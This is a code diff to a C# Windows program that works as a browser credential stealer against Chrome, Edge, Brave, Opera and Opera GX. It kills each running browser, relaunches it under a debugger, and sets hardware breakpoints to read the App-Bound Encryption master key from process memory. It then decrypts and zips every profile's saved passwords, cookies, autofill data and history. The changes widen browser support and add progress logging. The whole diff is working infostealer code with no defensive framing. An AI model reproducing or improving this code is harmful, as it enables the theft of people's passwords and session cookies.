@@ -16,7 +16,7 @@ namespace ConsoleApp1
             public string Name { get; set; }
             public string ProcessName { get; set; }
             public string[] ExePaths { get; set; }
-            public string DllName { get; set; }
+            public string[] DllNames { get; set; }
             public string[] UserDataSubdir { get; set; }
             public string OutputDir { get; set; }
             public string TempPrefix { get; set; }
@@ -36,7 +36,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                     @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
                 },
-                DllName = "chrome.dll",
+                DllNames = new[] { "chrome.dll" },
                 UserDataSubdir = new[] { "Google", "Chrome", "User Data" },
                 OutputDir = "chrome",
                 TempPrefix = "chrome_tmp",
@@ -53,7 +53,7 @@ namespace ConsoleApp1
                     @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                     @"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
                 },
-                DllName = "msedge.dll",
+                DllNames = new[] { "msedge.dll" },
                 UserDataSubdir = new[] { "Microsoft", "Edge", "User Data" },
                 OutputDir = "edge",
                 TempPrefix = "edge_tmp",
@@ -70,7 +70,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                     @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
                 },
-                DllName = "brave.dll",
+                DllNames = new[] { "brave.dll", "chrome.dll" },
                 UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" },
                 OutputDir = "brave",
                 TempPrefix = "brave_tmp",
@@ -88,7 +88,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\Opera\launcher.exe",
                     @"C:\Program Files (x86)\Opera\launcher.exe"
                 },
-                DllName = "launcher_lib.dll",
+                DllNames = new[] { "launcher_lib.dll" },
                 UserDataSubdir = new[] { "Opera Software", "Opera Stable" },
                 OutputDir = "opera",
                 TempPrefix = "opera_tmp",
@@ -106,7 +106,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\Opera GX\launcher.exe",
                     @"C:\Program Files (x86)\Opera GX\launcher.exe"
                 },
-                DllName = "launcher_lib.dll",
+                DllNames = new[] { "launcher_lib.dll" },
                 UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" },
                 OutputDir = "operagx",
                 TempPrefix = "operagx_tmp",
@@ -159,7 +159,7 @@ namespace ConsoleApp1
             public uint dwProcessId;
             [FieldOffset(8)]
             public uint dwThreadId;
-            [FieldOffset(16)] // Alignment padding for x64
+            [FieldOffset(16)]
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 160)]
             public byte[] u;
         }
@@ -192,13 +192,6 @@ namespace ConsoleApp1
             public uint NumberParameters;
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
             public IntPtr[] ExceptionInformation;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct M128A
-        {
-            public ulong Low;
-            public long High;
         }
 
         [StructLayout(LayoutKind.Explicit, Size = 1232)]
@@ -287,6 +280,28 @@ namespace ConsoleApp1
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern uint GetFinalPathNameByHandle(IntPtr hFile, [Out] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct THREADENTRY32
+        {
+            public uint dwSize;
+            public uint cntUsage;
+            public uint th32ThreadID;
+            public uint th32OwnerProcessID;
+            public int tpBasePri;
+            public int tpDeltaPri;
+            public uint dwFlags;
+        }
+
+        [DllImport("kernel32.dll")]
+        public static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);
+
+        public const uint TH32CS_SNAPTHREAD = 0x00000004;
         public const uint DEBUG_ONLY_THIS_PROCESS = 0x00000002;
         public const uint CREATE_NEW_CONSOLE = 0x00000010;
         public const uint INFINITE = 0xFFFFFFFF;
@@ -453,6 +468,8 @@ namespace ConsoleApp1
             if (string.IsNullOrEmpty(exePath))
                 return;
 
+            Console.WriteLine($"[*] Found {config.Name} at: {exePath}");
+
             KillProcessesByName(config.ProcessName);
             if (config.ProcessName != "launcher.exe" && config.Name.Contains("Opera"))
                 KillProcessesByName("launcher.exe");
@@ -464,11 +481,13 @@ namespace ConsoleApp1
             {
                 if (isDpapi && !config.HasAbe)
                 {
+                    Console.WriteLine($"[*] {config.Name} uses DPAPI, extracting...");
                     ExtractAllProfilesData(null, masterKey, config, userDataDir, zipPath);
                     shouldDebug = false;
                 }
                 else if (!isDpapi && !config.HasAbe)
                 {
+                    Console.WriteLine($"[*] {config.Name} uses ABE (pre-v125/Opera), extracting...");
                     ExtractAllProfilesData(masterKey, null, config, userDataDir, zipPath);
                     shouldDebug = false;
                 }
@@ -476,6 +495,7 @@ namespace ConsoleApp1
 
             if (shouldDebug)
             {
+                Console.WriteLine($"[*] Starting {config.Name} debugger to extract ABE key...");
                 STARTUPINFO si = new STARTUPINFO();
                 si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
@@ -488,6 +508,10 @@ namespace ConsoleApp1
                     TerminateProcess(pi.hProcess, 0);
                     CloseHandle(pi.hProcess);
                     CloseHandle(pi.hThread);
+                }
+                else
+                {
+                    Console.WriteLine($"[!] Failed to start {config.Name} for debugging.");
                 }
             }
         }
@@ -506,11 +530,13 @@ namespace ConsoleApp1
                     if (GetFinalPathNameByHandle(loadDll.hFile, sb, (uint)sb.Capacity, 0) > 0)
                     {
                         string path = sb.ToString();
-                        if (path.IndexOf(config.DllName, StringComparison.OrdinalIgnoreCase) >= 0)
+                        if (config.DllNames.Any(d => path.IndexOf(d, StringComparison.OrdinalIgnoreCase) >= 0))
                         {
+                            Console.WriteLine($"[*] Debugger: Found {Path.GetFileName(path)} at {loadDll.lpBaseOfDll:X}");
                             targetAddress = FindTargetAddress(hProcess, loadDll.lpBaseOfDll);
                             if (targetAddress != IntPtr.Zero)
                             {
+                                Console.WriteLine($"[*] Debugger: Target address found at {targetAddress:X}. Setting breakpoints...");
                                 foreach (uint tid in GetProcessThreads(debugEvent.dwProcessId))
                                 {
                                     SetHardwareBreakpoint(tid, targetAddress);
@@ -533,8 +559,10 @@ namespace ConsoleApp1
                     {
                         if (exception.ExceptionRecord.ExceptionAddress == targetAddress)
                         {
+                            Console.WriteLine($"[*] Debugger: Target breakpoint hit!");
                             if (ExtractKeyFromThread(debugEvent.dwThreadId, hProcess, config, userDataDir, zipPath))
                             {
+                                Console.WriteLine($"[*] Debugger: Master key extracted successfully.");
                                 ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                                 return;
                             }
@@ -587,7 +615,7 @@ namespace ConsoleApp1
             for (int i = 0; i < numSections; i++)
             {
                 string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
-                if (name == ".rdata")
+                if (name.StartsWith(".rdata") || name.StartsWith(".data"))
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
@@ -609,7 +637,7 @@ namespace ConsoleApp1
             for (int i = 0; i < numSections; i++)
             {
                 string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
-                if (name == ".text")
+                if (name.StartsWith(".text"))
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
@@ -648,8 +676,20 @@ namespace ConsoleApp1
 
         private static IEnumerable<uint> GetProcessThreads(uint pid)
         {
-            foreach (ProcessThread thread in Process.GetProcessById((int)pid).Threads)
-                yield return (uint)thread.Id;
+            IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (hSnapshot != IntPtr.Zero)
+            {
+                THREADENTRY32 te = new THREADENTRY32();
+                te.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
+                if (Thread32First(hSnapshot, ref te))
+                {
+                    do
+                    {
+                        if (te.th32OwnerProcessID == pid) yield return te.th32ThreadID;
+                    } while (Thread32Next(hSnapshot, ref te));
+                }
+                CloseHandle(hSnapshot);
+            }
         }
 
         private static void SetHardwareBreakpoint(uint tid, IntPtr address)
@@ -706,23 +746,23 @@ namespace ConsoleApp1
                     byte[] buffer = new byte[32];
                     if (ReadProcessMemory(hProcess, (IntPtr)ptr, buffer, (uint)buffer.Length, out _))
                     {
-                        // Chromium stores its key in a std::string like structure
-                        // [data_ptr (8b)][length (8b)][capacity (8b)]
-                        // If length is <= 15, data might be stored inline (SSO), but for 32-byte keys it's always on heap.
-                        ulong dataPtr = BitConverter.ToUInt64(buffer, 0);
+                        ulong dataPtr = ptr;
                         ulong length = BitConverter.ToUInt64(buffer, 8);
 
+                        // If it looks like a std::string structure (length 32 at offset 8), follow the pointer
                         if (length == 32)
                         {
-                            byte[] key = new byte[32];
-                            if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, (uint)key.Length, out _))
+                            dataPtr = BitConverter.ToUInt64(buffer, 0);
+                        }
+
+                        byte[] key = new byte[32];
+                        if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, (uint)key.Length, out _))
+                        {
+                            if (key.Any(b => b != 0))
                             {
-                                if (key.Any(b => b != 0))
-                                {
-                                    ExtractAllProfilesData(key, null, config, userDataDir, zipPath);
-                                    success = true;
-                                    break;
-                                }
+                                ExtractAllProfilesData(key, null, config, userDataDir, zipPath);
+                                success = true;
+                                break;
                             }
                         }
                     }
@@ -892,18 +932,29 @@ namespace ConsoleApp1
 
         private static void ExtractAllProfilesData(byte[] v20Key, byte[] v10Key, BrowserConfig config, string userDataDir, string zipPath)
         {
-            var profiles = Directory.GetDirectories(userDataDir).Where(d => File.Exists(Path.Combine(d, "Preferences"))).Select(Path.GetFileName);
+            var profiles = Directory.GetDirectories(userDataDir)
+                .Where(d => File.Exists(Path.Combine(d, "Preferences")))
+                .Select(Path.GetFileName)
+                .ToList();
+
             bool isOpera = config.Name.Contains("Opera");
+
+            // For Opera/other browsers that might store profile data in the root directory
+            if (File.Exists(Path.Combine(userDataDir, "Preferences")) && !profiles.Contains("."))
+            {
+                profiles.Add(".");
+            }
 
             foreach (var profile in profiles)
             {
-                string profilePath = Path.Combine(userDataDir, profile);
+                string profilePath = profile == "." ? userDataDir : Path.Combine(userDataDir, profile);
+                string profileName = profile == "." ? "Default" : profile;
                 string browserName = config.OutputDir;
 
-                ExtractPasswords(profilePath, zipPath, v10Key, v20Key, browserName, profile, isOpera);
-                ExtractCookies(profilePath, zipPath, v10Key, v20Key, browserName, profile, isOpera);
-                ExtractAutofill(profilePath, zipPath, v10Key, v20Key, browserName, profile, isOpera);
-                ExtractHistory(profilePath, zipPath, browserName, profile);
+                ExtractPasswords(profilePath, zipPath, v10Key, v20Key, browserName, profileName, isOpera);
+                ExtractCookies(profilePath, zipPath, v10Key, v20Key, browserName, profileName, isOpera);
+                ExtractAutofill(profilePath, zipPath, v10Key, v20Key, browserName, profileName, isOpera);
+                ExtractHistory(profilePath, zipPath, browserName, profileName);
             }
         }
 
